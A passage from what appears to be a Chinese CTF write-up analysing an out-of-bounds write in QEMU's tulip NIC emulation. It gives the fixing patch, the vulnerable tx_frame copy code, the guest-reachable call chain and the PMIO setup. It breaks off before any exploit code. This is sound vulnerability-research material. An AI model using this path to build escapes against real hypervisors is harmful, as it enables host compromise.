4</span></span><br><span class="line"><span class="addition">+        || s-&gt;rx_frame_len || tulip_rx_stopped(s)) &#123;</span></span><br><span class="line">         return 0;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@@ -275,7 +278,6 @@</span></span><br><span class="line">     return tulip_receive(qemu_get_nic_opaque(nc), buf, size);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-</span></span><br><span class="line"> static NetClientInfo net_tulip_info = &#123;</span><br><span class="line">     .type = NET_CLIENT_DRIVER_NIC,</span><br><span class="line">     .size = sizeof(NICState),</span><br><span class="line"><span class="meta">@@ -558,7 +560,7 @@</span></span><br><span class="line">         if ((s-&gt;csr[6] &gt;&gt; CSR6_OM_SHIFT) &amp; CSR6_OM_MASK) &#123;</span><br><span class="line">             /* Internal or external Loopback */</span><br><span class="line">             tulip_receive(s, s-&gt;tx_frame, s-&gt;tx_frame_len);</span><br><span class="line"><span class="deletion">-        &#125; else &#123;</span></span><br><span class="line"><span class="addition">+        &#125; else if (s-&gt;tx_frame_len &lt;= sizeof(s-&gt;tx_frame)) &#123;</span></span><br><span class="line">             qemu_send_packet(qemu_get_queue(s-&gt;nic),</span><br><span class="line">                 s-&gt;tx_frame, s-&gt;tx_frame_len);</span><br><span class="line">         &#125;</span><br><span class="line"><span class="meta">@@ -570,23 +572,31 @@</span></span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-static void tulip_copy_tx_buffers(TULIPState *s, struct tulip_descriptor *desc)</span></span><br><span class="line"><span class="addition">+static int tulip_copy_tx_buffers(TULIPState *s, struct tulip_descriptor *desc)</span></span><br><span class="line"> &#123;</span><br><span class="line">     int len1 = (desc-&gt;control &gt;&gt; TDES1_BUF1_SIZE_SHIFT) &amp; TDES1_BUF1_SIZE_MASK;</span><br><span class="line">     int len2 = (desc-&gt;control &gt;&gt; TDES1_BUF2_SIZE_SHIFT) &amp; TDES1_BUF2_SIZE_MASK;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+    if (s-&gt;tx_frame_len + len1 &gt; sizeof(s-&gt;tx_frame)) &#123;</span></span><br><span class="line"><span class="addition">+        return -1;</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line">     if (len1) &#123;</span><br><span class="line">         pci_dma_read(&amp;s-&gt;dev, desc-&gt;buf_addr1,</span><br><span class="line">             s-&gt;tx_frame + s-&gt;tx_frame_len, len1);</span><br><span class="line">         s-&gt;tx_frame_len += len1;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+    if (s-&gt;tx_frame_len + len2 &gt; sizeof(s-&gt;tx_frame)) &#123;</span></span><br><span class="line"><span class="addition">+        return -1;</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line">     if (len2) &#123;</span><br><span class="line">         pci_dma_read(&amp;s-&gt;dev, desc-&gt;buf_addr2,</span><br><span class="line">             s-&gt;tx_frame + s-&gt;tx_frame_len, len2);</span><br><span class="line">         s-&gt;tx_frame_len += len2;</span><br><span class="line">     &#125;</span><br><span class="line">     desc-&gt;status = (len1 + len2) ? 0 : 0x7fffffff;</span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+    return 0;</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> static void tulip_setup_filter_addr(TULIPState *s, uint8_t *buf, int n)</span><br><span class="line"><span class="meta">@@ -651,13 +661,15 @@</span></span><br><span class="line"> </span><br><span class="line"> static void tulip_xmit_list_update(TULIPState *s)</span><br><span class="line"> &#123;</span><br><span class="line"><span class="addition">+#define TULIP_DESC_MAX 128</span></span><br><span class="line"><span class="addition">+    uint8_t i = 0;</span></span><br><span class="line">     struct tulip_descriptor desc;</span><br><span class="line"> </span><br><span class="line">     if (tulip_ts(s) != CSR5_TS_SUSPENDED) &#123;</span><br><span class="line">         return;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-    for (;;) &#123;</span></span><br><span class="line"><span class="addition">+    for (i = 0; i &lt; TULIP_DESC_MAX; i++) &#123;</span></span><br><span class="line">         tulip_desc_read(s, s-&gt;current_tx_desc, &amp;desc);</span><br><span class="line">         tulip_dump_tx_descriptor(s, &amp;desc);</span><br><span class="line"> </span><br><span class="line"><span class="meta">@@ -675,10 +687,10 @@</span></span><br><span class="line">                 s-&gt;tx_frame_len = 0;</span><br><span class="line">             &#125;</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-            tulip_copy_tx_buffers(s, &amp;desc);</span></span><br><span class="line"><span class="deletion">-</span></span><br><span class="line"><span class="deletion">-            if (desc.control &amp; TDES1_LS) &#123;</span></span><br><span class="line"><span class="deletion">-                tulip_tx(s, &amp;desc);</span></span><br><span class="line"><span class="addition">+            if (!tulip_copy_tx_buffers(s, &amp;desc)) &#123;</span></span><br><span class="line"><span class="addition">+                if (desc.control &amp; TDES1_LS) &#123;</span></span><br><span class="line"><span class="addition">+                    tulip_tx(s, &amp;desc);</span></span><br><span class="line"><span class="addition">+                &#125;</span></span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">         tulip_desc_write(s, s-&gt;current_tx_desc, &amp;desc);</span><br></pre></td></tr></table></figure>
<p>可以发现函数 <code>tulip_copy_tx_buffers</code> 中缺少了一个检查，核心代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (len1) &#123;</span><br><span class="line">    pci_dma_read(&amp;s-&gt;dev, desc-&gt;buf_addr1,</span><br><span class="line">        s-&gt;tx_frame + s-&gt;tx_frame_len, len1);</span><br><span class="line">    s-&gt;tx_frame_len += len1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (len2) &#123;</span><br><span class="line">    pci_dma_read(&amp;s-&gt;dev, desc-&gt;buf_addr2,</span><br><span class="line">        s-&gt;tx_frame + s-&gt;tx_frame_len, len2);</span><br><span class="line">    s-&gt;tx_frame_len += len2;</span><br><span class="line">&#125;</span><br><span class="line">desc-&gt;status = (len1 + len2) ? <span class="number">0</span> : <span class="number">0x7fffffff</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>tulip_copy_tx_buffers</code> 是一个 TULIP 库中的函数，用于将设备驱动程序中的数据传输到网络适配器的物理内存中 </li>
<li>当我们多次调用 <code>tulip_copy_tx_buffers</code> 时，<code>s-&gt;tx_frame_len</code> 可能被加到一个非常大的值</li>
</ul>
<p>未对虚拟机传入的长度字段进行校验，导致产生了针对 <code>tx_frame</code> 和 <code>rx_framd</code> 的数组越界写，这两个数组都是结构体 <code>TULIPState</code> 的条目：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">TULIPState</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    PCIDevice dev;			<span class="comment">/* PCI设备结构体的指针,用于存储设备的硬件信息 */</span></span><br><span class="line">    MemoryRegion io;		<span class="comment">/* 内存区域结构体的指针,用于存储设备的I/O地址空间 */</span></span><br><span class="line">    MemoryRegion memory;	<span class="comment">/* 内存区域结构体的指针,用于存储设备的内存地址空间 */</span></span><br><span class="line">    NICConf c;				</span><br><span class="line">    qemu_irq irq;			<span class="comment">/* qemu中断结构体的指针,用于存储网络适配器的中断 */</span></span><br><span class="line">    NICState *nic;			</span><br><span class="line">    <span class="keyword">eeprom_t</span> *eeprom;</span><br><span class="line">    <span class="keyword">uint32_t</span> csr[<span class="number">16</span>];		<span class="comment">/* 16个32位寄存器数组,用于存储网络适配器的寄存器值 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* state for MII */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> old_csr9;</span><br><span class="line">    <span class="keyword">uint32_t</span> mii_word;</span><br><span class="line">    <span class="keyword">uint32_t</span> mii_bitcnt;</span><br><span class="line"></span><br><span class="line">    hwaddr current_rx_desc;		<span class="comment">/* 接收描述符的硬件地址 */</span></span><br><span class="line">    hwaddr current_tx_desc;		<span class="comment">/* 发送描述符的硬件地址 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> rx_frame[<span class="number">2048</span>];		<span class="comment">/* 接收缓冲区,用于存储接收到的数据 */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> tx_frame[<span class="number">2048</span>];		<span class="comment">/* 发送缓冲区,用于存储待发送的数据 */</span></span><br><span class="line">    <span class="keyword">int</span> tx_frame_len;			<span class="comment">/* 发送缓冲区中已发送的数据长度 */</span></span><br><span class="line">    <span class="keyword">int</span> rx_frame_len;			<span class="comment">/* 接收缓冲区中已接收的数据长度 */</span></span><br><span class="line">    <span class="keyword">int</span> rx_frame_size;			<span class="comment">/* 接收缓冲区中数据帧的大小 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> rx_status;			<span class="comment">/* 接收状态寄存器,用于存储接收状态信息 */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> filter[<span class="number">16</span>][<span class="number">6</span>];		<span class="comment">/* 一个16行6列的数组,用于存储过滤器 */</span></span><br><span class="line">&#125; TULIPState;</span><br></pre></td></tr></table></figure>
<p><strong>程序分析</strong></p>
<p>本题目找不到 tulip.ko 的设备标识符：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="meta"># find . -name tulip</span></span><br><span class="line">./sys/bus/pci/drivers/tulip</span><br><span class="line">./sys/<span class="keyword">module</span>/tulip</span><br></pre></td></tr></table></figure>
<p>IDA 分析发现，tulip.ko 只注册了驱动，但是没有注册设备标识符：（其实 Qemu 逃逸类题目和内核题目不同，大多数时候都不需要设备标识符）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">tulip_init</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(a1, a2);</span><br><span class="line">  printk(&amp;unk_94CF, version);</span><br><span class="line">  <span class="keyword">if</span> ( !csr0 )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_A6F0, version);</span><br><span class="line">    csr0 = <span class="number">0xA04800</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  tulip_rx_copybreak = rx_copybreak;</span><br><span class="line">  tulip_max_interrupt_work = max_interrupt_work;</span><br><span class="line">  <span class="keyword">return</span> _pci_register_driver(&amp;tulip_driver, &amp;_this_module, <span class="string">&quot;tulip&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先使用 <code>info pci</code> 查看 qemu 的 PCI 设备：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Bus  <span class="number">0</span>, device   <span class="number">4</span>, function <span class="number">0</span>:</span><br><span class="line">  Ethernet controller: PCI device <span class="number">1011</span>:<span class="number">0019</span></span><br><span class="line">    PCI subsystem <span class="number">103</span>c:<span class="number">104f</span></span><br><span class="line">    IRQ <span class="number">11.</span></span><br><span class="line">    BAR0: I/O at <span class="number">0xc000</span> [<span class="number">0xc07f</span>].</span><br><span class="line">    BAR1: <span class="number">32</span> bit memory at <span class="number">0xfebf1000</span> [<span class="number">0xfebf107f</span>].</span><br><span class="line">    id <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>需要先在 run.sh 中添加 <code>-monitor telnet:127.0.0.1:4444,server,nowait</code> 选项</li>
<li>然后使用 <code>nc 127.0.0.1 4444</code> 和 <code>info pci</code> 进行查看</li>
</ul>
<p>基于 0xc000 我们就可以使用 pmio 来调用 <code>tulip_read</code> 和 <code>tulip_write</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> MemoryRegionOps tulip_ops = &#123;</span><br><span class="line">    .read = tulip_read,</span><br><span class="line">    .write = tulip_write,</span><br><span class="line">    .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">    .impl = &#123;</span><br><span class="line">        .min_access_size = <span class="number">4</span>,</span><br><span class="line">        .max_access_size = <span class="number">4</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>函数 <code>tulip_write</code> 的功能较为复杂，这里只分析我们需要的部分：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSR6_FC         BIT(12)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSR6_ST         BIT(13)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">tulip_write</span><span class="params">(<span class="keyword">void</span> *opaque, hwaddr addr,</span></span></span><br><span class="line"><span class="params"><span class="function">                        <span class="keyword">uint64_t</span> data, <span class="keyword">unsigned</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TULIPState *s = opaque;</span><br><span class="line">    trace_tulip_reg_write(addr, tulip_reg_name(addr), size, data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (addr)</span><br><span class="line">    &#123;</span><br><span class="line">            ......</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">case</span> <span class="title">CSR</span><span class="params">(<span class="number">3</span>)</span>:</span></span><br><span class="line"><span class="function">        s-&gt;csr[3] </span>= data &amp; ~<span class="number">3ULL</span>;</span><br><span class="line">        s-&gt;current_rx_desc = s-&gt;csr[<span class="number">3</span>]; <span class="comment">/* 设置接收描述符的硬件地址 */</span></span><br><span class="line">        qemu_flush_queued_packets(qemu_get_queue(s-&gt;nic)); <span class="comment">/* 刷新网络适配器队列 */</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">case</span> <span class="title">CSR</span><span class="params">(<span class="number">4</span>)</span>:</span></span><br><span class="line"><span class="function">        s-&gt;csr[4] </span>= data &amp; ~<span class="number">3ULL</span>;</span><br><span class="line">        s-&gt;current_tx_desc = s-&gt;csr[<span class="number">4</span>]; <span class="comment">/* 设置接收描述符的硬件地址 */</span></span><br><span class="line">        tulip_xmit_list_update(s); <span class="comment">/* 间接调用漏洞函数 */</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">case</span> <span class="title">CSR</span><span class="params">(<span class="number">5</span>)</span>:</span></span><br><span class="line"><span class="function">        <span class="comment">/* Status register, write clears bit */</span></span></span><br><span class="line"><span class="function">        s-&gt;csr[5] &amp;</span>= ~(data &amp; (CSR5_TI | CSR5_TPS | CSR5_TU | CSR5_TJT |</span><br><span class="line">                               CSR5_LNP_ANC | CSR5_UNF | CSR5_RI | CSR5_RU |</span><br><span class="line">                               CSR5_RPS | CSR5_RWT | CSR5_ETI | CSR5_GTE |</span><br><span class="line">                               CSR5_LNF | CSR5_FBE | CSR5_ERI | CSR5_AIS |</span><br><span class="line">                               CSR5_NIS | CSR5_GPI | CSR5_LC));</span><br><span class="line">        tulip_update_int(s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">case</span> <span class="title">CSR</span><span class="params">(<span class="number">6</span>)</span>:</span></span><br><span class="line"><span class="function">        s-&gt;csr[6] </span>= data;</span><br><span class="line">        <span class="keyword">if</span> (s-&gt;csr[<span class="number">6</span>] &amp; CSR6_SR)</span><br><span class="line">        &#123;</span><br><span class="line">            tulip_update_rs(s, CSR5_RS_RUNNING_WAIT_RECEIVE);</span><br><span class="line">            qemu_flush_queued_packets(qemu_get_queue(s-&gt;nic));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            tulip_update_rs(s, CSR5_RS_STOPPED);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (s-&gt;csr[<span class="number">6</span>] &amp; CSR6_ST)</span><br><span class="line">        &#123;</span><br><span class="line">            tulip_update_ts(s, CSR5_TS_SUSPENDED);</span><br><span class="line">            tulip_xmit_list_update(s); <span class="comment">/* 间接调用漏洞函数 */</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            tulip_update_ts(s, CSR5_TS_STOPPED);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">            </span><br><span class="line">            ......</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        qemu_log_mask(LOG_GUEST_ERROR, <span class="string">&quot;%s: write to CSR at unknown address &quot;</span></span><br><span class="line">                                       <span class="string">&quot;0x%&quot;</span> PRIx64 <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">                      __func__, addr);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>函数 <code>tulip_xmit_list_update</code> 会间接调用漏洞函数，我们可以分析一下调用链：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">tulip_xmit_list_update</span><span class="params">(TULIPState *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tulip_descriptor</span> <span class="title">desc</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tulip_ts(s) != CSR5_TS_SUSPENDED) <span class="comment">/* 如果网络适配器不处于暂停状态,则返回 */</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">        tulip_desc_read(s, s-&gt;current_tx_desc, &amp;desc); <span class="comment">/* 从s-&gt;current_tx_desc中读取网络适配器的描述符,并写入desc */</span></span><br><span class="line">        tulip_dump_tx_descriptor(s, &amp;desc); <span class="comment">/* 执行PCI DMA操作 */</span></span><br><span class="line">        </span><br><span class="line">        ......</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (desc.control &amp; TDES1_SET)</span><br><span class="line">        &#123;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            ......</span><br><span class="line">            tulip_copy_tx_buffers(s, &amp;desc); <span class="comment">/* 调用漏洞函数 */</span></span><br><span class="line">            <span class="keyword">if</span> (desc.control &amp; TDES1_LS)</span><br><span class="line">            &#123;</span><br><span class="line">                tulip_tx(s, &amp;desc); <span class="comment">/* 将数据发送到网络适配器 */</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        tulip_desc_write(s, s-&gt;current_tx_desc, &amp;desc);</span><br><span class="line">        tulip_next_tx_descriptor(s, &amp;desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">tulip_copy_tx_buffers</span><span class="params">(TULIPState *s, struct tulip_descriptor *desc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len1 = (desc-&gt;control &gt;&gt; TDES1_BUF1_SIZE_SHIFT) &amp; TDES1_BUF1_SIZE_MASK;</span><br><span class="line">    <span class="keyword">int</span> len2 = (desc-&gt;control &gt;&gt; TDES1_BUF2_SIZE_SHIFT) &amp; TDES1_BUF2_SIZE_MASK;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len1)</span><br><span class="line">    &#123;</span><br><span class="line">        pci_dma_read(&amp;s-&gt;dev, desc-&gt;buf_addr1,</span><br><span class="line">                     s-&gt;tx_frame + s-&gt;tx_frame_len, len1); </span><br><span class="line">        <span class="comment">/* 从地址desc-&gt;buf_addr1处,传输数据到主机内存tx_frame + tx_frame_len */</span></span><br><span class="line">        s-&gt;tx_frame_len += len1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len2)</span><br><span class="line">    &#123;</span><br><span class="line">        pci_dma_read(&amp;s-&gt;dev, desc-&gt;buf_addr2,</span><br><span class="line">                     s-&gt;tx_frame + s-&gt;tx_frame_len, len2);</span><br><span class="line">        s-&gt;tx_frame_len += len2;</span><br><span class="line">    &#125;</span><br><span class="line">    desc-&gt;status = (len1 + len2) ? <span class="number">0</span> : <span class="number">0x7fffffff</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>调用链为：<code>tulip_write -&gt; tulip_xmit_list_update -&gt; tulip_copy_tx_buffers -&gt; pci_dma_read</code></li>
<li>条件为：<code>tulip_ts(s) == CSR5_TS_SUSPENDED</code></li>
</ul>
<p>在设置了 <code>TDES1_LS</code> 后，则会调用 <code>tulip_tx</code> 函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">tulip_tx</span><span class="params">(TULIPState *s, struct tulip_descriptor *desc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s-&gt;tx_frame_len) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((s-&gt;csr[<span class="number">6</span>] &gt;&gt; CSR6_OM_SHIFT) &amp; CSR6_OM_MASK) &#123;</span><br><span class="line">            <span class="comment">/* Internal or external Loopback */</span></span><br><span class="line">            tulip_receive(s, s-&gt;tx_frame, s-&gt;tx_frame_len);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            qemu_send_packet(qemu_get_queue(s-&gt;nic),</span><br><span class="line">                s-&gt;tx_frame, s-&gt;tx_frame_len);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (desc-&gt;control &amp; TDES1_IC) &#123;</span><br><span class="line">        s-&gt;csr[<span class="number">5</span>] |= CSR5_TI;</span><br><span class="line">        tulip_update_int(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>在通过 <code>s-&gt;csr[6] &gt;&gt; CSR6_OM_SHIFT) &amp; CSR6_OM_MASK</code> 条件后则会调用 <code>tulip_receive</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">tulip_receive</span><span class="params">(TULIPState *s, <span class="keyword">const</span> <span class="keyword">uint8_t</span> *buf, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tulip_descriptor</span> <span class="title">desc</span>;</span></span><br><span class="line"></span><br><span class="line">    trace_tulip_receive(buf, size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size &lt; <span class="number">14</span> || size &gt; <span class="number">2048</span> || tulip_rx_stopped(s)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!tulip_filter_address(s, buf)) &#123;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span 